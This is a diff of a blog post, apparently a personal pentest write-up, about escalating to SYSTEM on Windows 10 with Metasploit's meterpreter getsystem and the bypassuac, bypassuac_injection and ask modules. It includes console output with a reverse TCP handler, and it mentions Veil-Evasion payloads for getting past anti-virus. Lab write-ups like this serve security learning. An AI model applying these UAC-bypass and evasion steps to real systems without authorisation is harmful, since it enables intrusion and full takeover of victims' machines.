@@ -6,9 +6,9 @@ layout: post
 
 Dusting off `msfconsole` and the Metasploit framework itself, it was time for me to get back on my feet with penetration testing.
 <!--more-->
-With the recent ransomware [WannaCry](http://www.cnn.com/2017/05/14/opinions/wannacrypt-attack-should-make-us-wanna-cry-about-vulnerability-urbelis/) spreading throughout the globe, I pondered upon the question on how malware is able to attain system-level privileges on a Windows machine, locking it down, and making it near-impossible to circumvent.
+With the recent ransomware [WannaCry](http://www.cnn.com/2017/05/14/opinions/wannacrypt-attack-should-make-us-wanna-cry-about-vulnerability-urbelis/) spreading throughout the globe, I pondered upon the question on how malware is able to attain system-level privileges on a regular Windows machine, locking it down, and making it near-impossible to circumvent.
 
-When utilizing Metasploit against Windows targets, its essential to escalate user privileges to __SYSTEM__, otherwise being stuck on a user account with regular permissions limit the pentest. As penetration testers, privilege escalation is considered the most critical point of the post-exploitation step, and all the hard work from gaining initial access, maintaining persistence and circumventing the anti-virus will all seem meaningless.
+When utilizing Metasploit against Windows targets, it is essential to escalate user privileges to __SYSTEM__, otherwise being stuck on a user account with regular permissions will limit the pentest. As penetration testers, privilege escalation is considered the most critical point of the post-exploitation step, and all the hard work from gaining initial access, maintaining persistence and circumventing the anti-virus will all seem meaningless.
 
 What are some fun things we can do once we attain __SYSTEM__?
 
@@ -26,18 +26,12 @@ Metasploit's `meterpreter` console comes with some built-in Ruby scripts that ca
 
 In this case, I utilized the built in `getsystem` script. Well, what __exactly__ does `getsystem` do? `getsystem` works on three different techniques. Although I won't go in detail about how they work, Cobalt Strike (a Metasploit GUI framework) wrote a [great blog post](https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/) about it.
 
-This exploit, CVE-2008-4250, is one of the staples of vulnerabilities in the early Windows XP operating systems. Yes, Windows __XP__. What happens if we attempt to gain privileges on a pwn'ed Windows 8 or 10 machine?
+## Fun and Games
 
+Let's have some fun breaking into a machine and gaining privileges. Originally, the `ms08_067_netapi` exploit was designed
+for Windows XP machines, and is definitely not going to work for our modern operating systems and attempting to `getsystem` on just a test XP machine won't prove to be as challenging as privilege escalation on Windows 10.
 
-    msf exploit(handler) > exploit
-    ...
-    meterpreter > getsystem
-    [-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:
-    [-] Named Pipe Impersonation (In Memory/Admin)
-    [-] Named Pipe Impersonation (Dropper/Admin)
-    [-] Token Duplication (In Memory/Admin)
-
-Using a standard Veil-Evasion encrypted Meterpreter payload binary, I gained physical access inside my test Windows 10 machine. Not as fun as fileless access, but gets the work done. However, when we attempt to utilize `getsystem` this time, all three methods of it ceased to work. Even doing `getprivs` doesn't yield us that many permissions.
+Using a standard Veil-Evasion encrypted Meterpreter payload binary, I gained physical access inside my test Windows 10 machine. Not as fun as fileless access, but gets the work done. However, when we attempt to utilize `getsystem` this time, all three methods ceased to work. Even doing `getprivs` doesn't yield us that many permissions.
 
     meterpreter > getprivs
     ============================================================
@@ -65,7 +59,7 @@ In order to circumvent this, we need to rely on some different techniques.
 
 This is a method which spawns a new shell session with UAC disabled as a process. This attack works, however, on the basis that UAC is set as "Notify me only when programs try to make changes to my computer", which is standard for many operating systems.
 
- Let's background our current `meterpreter` session and load it up.
+ Let's background our current `meterpreter` session and load up this module up.
 
     meterpreter > background
     [*] Backgrounding session 2...
@@ -88,7 +82,7 @@ This is a method which spawns a new shell session with UAC disabled as a process
 
 Once complete, we are able to `getsystem` as we did previously.
 
-Of course, this may not totally work. If UAC is set to "Always Notify", loading this process as part of memory will fail. Therefore, if you use a build of Windows that is Vista it will not work, as this is feature is default. In this case, the attack against my Windows 10 build failed
+Of course, this may not totally work. If UAC is set to "Always Notify", loading this process as part of memory will fail. Therefore, if you use a build of Windows that is Vista it will not work, as this is feature is default. In this case, the attack against my Windows 10 build failed.
 
     msf exploit(bypassuac) > exploit
 
@@ -118,7 +112,11 @@ This exploit aims to to inject a DLL binary through the Reflective DLL Injection
     msf(bypassuac_injection) > set SESSION 2
     SESSION => 2
     msf(bypassuac_injection) > exploit
-    ...
+    [*] Started reverse TCP handler on 192.168.1.170:4444
+    [-] Exploit aborted due to failure: not-vulnerable: Windows 10 (Build 14393). is not vulnerable.
+    [*] Exploit completed, but no session was created.
+
+Hmmmm, still not fooling anyone.
 
 ### Windows Escalate UAC Execute RunAs
 
@@ -143,7 +141,7 @@ This last exploit was actually from [this Metasploitation video](https://www.you
     msf(ask) > exploit
     ...
 
-Once executed, UAC will give a prompt to a user. Once completed, the exploit finishes, and you are able to `getsystem`.
+Once executed, the UAC on the Windows machine threw a prompt to a user. Once the user selects OK, the exploit finishes, and I was able to `getsystem`. Success!
 
 ---
 
